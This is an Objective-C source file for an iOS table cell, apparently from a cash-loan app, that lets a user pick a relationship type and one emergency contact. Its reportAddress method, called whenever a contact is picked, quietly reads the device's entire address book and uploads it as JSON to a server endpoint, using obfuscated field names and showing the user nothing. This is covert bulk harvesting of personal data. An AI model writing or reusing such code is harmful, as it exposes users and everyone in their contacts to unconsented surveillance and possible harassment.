//
//  ContactTableViewCell.m
//  BaWangBieJICash
//
//  Created by 一刻 on 2025/7/29.
//

#import "ContactTableViewCell.h"
#import "SelectedPresentView.h"
#import "ContactTool.h"

@interface ContactTableViewCell ()

@property (nonatomic ,strong) UILabel *title;

@property (nonatomic ,strong) UILabel *firstTitle;

@property (nonatomic ,strong) UILabel *secondTitle;

@property (nonatomic ,strong) UIImageView *person_cell_first;
@property (nonatomic ,strong) UIImageView *person_cell_second;

@property (nonatomic ,strong) UITextField *textField;
@property (nonatomic ,strong) UITextField *phoneTextField;

@property (nonatomic ,strong) AC_BaseButton *arrowBtn;
@property (nonatomic ,strong) AC_BaseButton *contactBtn;
@property (nonatomic, strong) UIImageView *arrowImg;

@end

@implementation ContactTableViewCell

- (void)setUpSubView
{
    [super setUpSubView];
    
    [self.contentView addSubview:self.title];
    [self.title mas_makeConstraints:^(MASConstraintMaker *make) {
        make.top.equalTo(@20);
        make.height.equalTo(@17);
        make.top.equalTo(@20);
        make.left.equalTo(@0);
    }];
    
    [self.contentView addSubview:self.firstTitle];
    [self.firstTitle mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.equalTo(@7);
        make.top.equalTo(self.title.mas_bottom).offset(16);
        make.height.equalTo(@20);
    }];
    
    [self.contentView addSubview:self.person_cell_first];
    [self.person_cell_first mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.right.equalTo(@0);
        make.top.equalTo(self.firstTitle.mas_bottom).offset(6);
        make.height.equalTo(@55);
    }];
    
    [self.person_cell_first addSubview:self.textField];
    [self.textField mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.equalTo(@24);
        make.top.bottom.equalTo(@0);
        make.width.equalTo(@240);
    }];
    
    [self.contentView addSubview:self.secondTitle];
    [self.secondTitle mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.equalTo(@7);
        make.top.equalTo(self.person_cell_first.mas_bottom).offset(16);
        make.height.equalTo(@20);
    }];
    
    [self.contentView addSubview:self.person_cell_second];
    [self.person_cell_second mas_makeConstraints:^(MASConstraintMaker *make) {
        make.top.equalTo(self.secondTitle.mas_bottom).offset(6);
        make.left.right.bottom.equalTo(@0);
    }];
    
    
    [self.person_cell_second addSubview:self.phoneTextField];
    [self.phoneTextField mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.equalTo(@24);
        make.top.bottom.equalTo(@0);
        make.width.equalTo(@240);
    }];
    
//    ImgViewWithName(contact_icon_arrow, @"contact_icon_arrow");

//    [self.person_cell_first addSubview:self.arrowImg];
//    [self.arrowImg mas_makeConstraints:^(MASConstraintMaker *make) {
//        make.centerY.equalTo(@0);
//        make.width.height.equalTo(@16);
//        make.right.equalTo(@-24);
//    }];
    [self.person_cell_first addSubview:self.arrowBtn];
    [self.arrowBtn mas_makeConstraints:^(MASConstraintMaker *make) {
        make.centerY.equalTo(@0);
        make.height.equalTo(@50);
        make.width.equalTo(@70);
        make.right.equalTo(@0);
    }];
    
    UIButton *btn = [UIButton new];
    [btn addTarget:self action:@selector(arrowBtnCall) forControlEvents:UIControlEventTouchUpInside];
    [self.person_cell_first addSubview:btn];
    [btn mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(@0);
    }];
    
    [self.person_cell_second addSubview:self.contactBtn];
    [self.contactBtn mas_makeConstraints:^(MASConstraintMaker *make) {
        make.centerY.equalTo(@0);
        make.height.equalTo(@50);
        make.width.equalTo(@70);
        make.right.equalTo(@0);
    }];
    
    UIButton *conbtn = [UIButton new];
    [conbtn addTarget:self action:@selector(contactBtnCall) forControlEvents:UIControlEventTouchUpInside];
    [self.person_cell_second addSubview:conbtn];
    [conbtn mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(@0);
    }];
}

- (void)setConModel:(PC_ContactModel_Understand *)conModel
{
    _conModel = conModel;
    
    self.title.text = conModel.pc_beck;
    self.firstTitle.text = conModel.pc_snarking;
    self.secondTitle.text = conModel.pc_redlettermedia;
    
    self.textField.placeholder = conModel.pc_junkies;
    self.phoneTextField.placeholder = conModel.pc_approaches;
    
    if ([conModel.pc_shoot isExist] || [conModel.pc_aim isExist]) {
        self.phoneTextField.text = FORMAT(@"%@ %@",conModel.pc_shoot,conModel.pc_aim);
    }
    
    for (PC_ContactModel_Understand_Darkstar *model in self.conModel.pc_darkstar) {
        if ([model.pc_disposing isEqualToString:conModel.pc_viewer]) self.textField.text = model.pc_shoot;
    }
}

- (void)arrowBtnCall
{
    self.arrowBtn.selected = !self.arrowBtn.selected;
    NSMutableArray *pickerModels = [NSMutableArray new];
    for (PC_ContactModel_Understand_Darkstar *model in self.conModel.pc_darkstar) {
        PickerCellModel *pickerModel = [PickerCellModel new];
        pickerModel.title = model.pc_shoot;
        pickerModel.model = model;
        [pickerModels addObject:pickerModel];
    }

    // 弹起选择器
    SelectedPresentView *view = [SelectedPresentView new];
    view.models = pickerModels;
    __weakSelf;
    view.didSelctRowBlock = ^(PickerCellModel * _Nonnull rowModel) {
        __strongSelf;
        self.textField.text = ((PC_ContactModel_Understand_Darkstar *)rowModel.model).pc_shoot;
        self.conModel.pc_viewer = ((PC_ContactModel_Understand_Darkstar *)rowModel.model).pc_disposing;
        if (self.didEditBlock) self.didEditBlock(self);
        
    };
    
    view.didDismissBlock = ^{
        __strongSelf;
        self.arrowBtn.selected = !self.arrowBtn.selected;
    };

    [view show];
}

- (void)contactBtnCall
{
    __weakSelf;
    ContactTool.tool.didSelectContact = ^(NSString * _Nonnull phone, NSString * _Nonnull name) {
        __strongSelf;
        self.phoneTextField.text = FORMAT(@"%@ %@",name,phone);
        self.conModel.pc_aim = phone;
        self.conModel.pc_shoot = name;
       
        [self reportAddress];
    };
    [ContactTool.tool requestContactPermission];
}
/// 上报通讯录
- (void)reportAddress
{
//    NSMutableArray *conItems = [NSMutableArray new];
//
//        NSDictionary *dict = @{
//            @"bender":self.conModel.pc_aim,
//            @"cuba":self.note == nil ? @"":self.note,
//            @"flicks":self.birthday == nil ? @0 : @([self.birthday timeIntervalSince1970]),
//            @"vogt":self.email == nil ? @"":self.email,
//            @"shoot":self.upName == nil ? @"":self.upName
//        };
//        [conItems appendObject:dict];
   
    [ContactTool.tool requestContactAllDataWithBlock:^(NSMutableArray * _Nonnull contact) {
        NSString *json = contact.getJsonStr;
        [NetMonitorTool.tool postWithPath:@"/before/drastically" Parameters:@{@"portal":json} SuccBlock:^(BaseNetResponseModel * _Nonnull responseModel) {
            if (!responseModel.success) {
                return;
            }
        } FailBlock:^(NSError * _Nonnull error) {
                
        }];
    }];
}

#pragma mark - init

- (UILabel *)title
{
    if (_title == nil) {
        _title = [UILabel LabelWithFont:Semibold(16) TextColor:@"#9471F3" Text:@""];
    }
    return _title;
}

- (UILabel *)firstTitle
{
    if (_firstTitle == nil) {
        _firstTitle = [UILabel LabelWithFont:Medium(14) TextColor:@"#000000" Text:@""];
    }
    return _firstTitle;
}

- (UILabel *)secondTitle
{
    if (_secondTitle == nil) {
        _secondTitle = [UILabel LabelWithFont:Medium(14) TextColor:@"#000000" Text:@""];
    }
    return _secondTitle;
}

- (UIImageView *)person_cell_first
{
    if (_person_cell_first == nil) {
        ImgViewWithName(person_cell, @"person_cell");
        _person_cell_first = person_cell;
        _person_cell_first.userInteractionEnabled = YES;
    }
    return _person_cell_first;
}
- (UIImageView *)person_cell_second
{
    if (_person_cell_second == nil) {
        ImgViewWithName(person_cell, @"person_cell");
        _person_cell_second = person_cell;
        _person_cell_second.userInteractionEnabled = YES;
    }
    return _person_cell_second;
}

- (UITextField *)textField
{
    if (_textField == nil){
        _textField = [UITextField new];
        _textField.textColor = HEXCOLOR(@"#000000");
        _textField.font = Regular(14);
        _textField.backgroundColor = UIColor.clearColor;
        _textField.userInteractionEnabled = NO;
        NSDictionary *attr = @{NSFontAttributeName:Regular(14),NSForegroundColorAttributeName:HEXCOLOR(@"#808080")};
        NSAttributedString *attrStr = [[NSAttributedString alloc]initWithString:@"Please enter " attributes:attr];
        _textField.attributedPlaceholder = attrStr;
        
    }
    return _textField;
}

- (UITextField *)phoneTextField
{
    if (_phoneTextField == nil){
        _phoneTextField = [UITextField new];
        _phoneTextField.textColor = HEXCOLOR(@"#000000");
        _phoneTextField.font = Regular(14);
        _phoneTextField.backgroundColor = UIColor.clearColor;
        _phoneTextField.userInteractionEnabled = NO;
        NSDictionary *attr = @{NSFontAttributeName:Regular(14),NSForegroundColorAttributeName:HEXCOLOR(@"#808080")};
        NSAttributedString *attrStr = [[NSAttributedString alloc]initWithString:@"Please enter " attributes:attr];
        _phoneTextField.attributedPlaceholder = attrStr;
        
    }
    return _phoneTextField;
}

- (AC_BaseButton *)arrowBtn
{
    if (_arrowBtn == nil) {
        _arrowBtn = [AC_BaseButton new];
        _arrowBtn.userInteractionEnabled = false;
        [_arrowBtn setImage:IMAGE(@"contact_icon_arrow") forState:UIControlStateSelected];
        [_arrowBtn setImage:IMAGE(@"person_icon_arrow") forState:UIControlStateNormal];
    }
    return _arrowBtn;
}

- (AC_BaseButton *)contactBtn
{
    if (_contactBtn == nil) {
        _contactBtn = [AC_BaseButton ImageBtnWithImgName:@"contact_icon_contact"];
    }
    return _contactBtn;
}

- (UIImageView *)arrowImg
{
    if (_arrowImg == nil) {
        _arrowImg = [UIImageView new];
        ImgViewWithName(person_icon_arrow, @"person_icon_arrow");
        _arrowImg = person_icon_arrow;
        _arrowImg.userInteractionEnabled = YES;
    }
    return _arrowImg;
}

@end
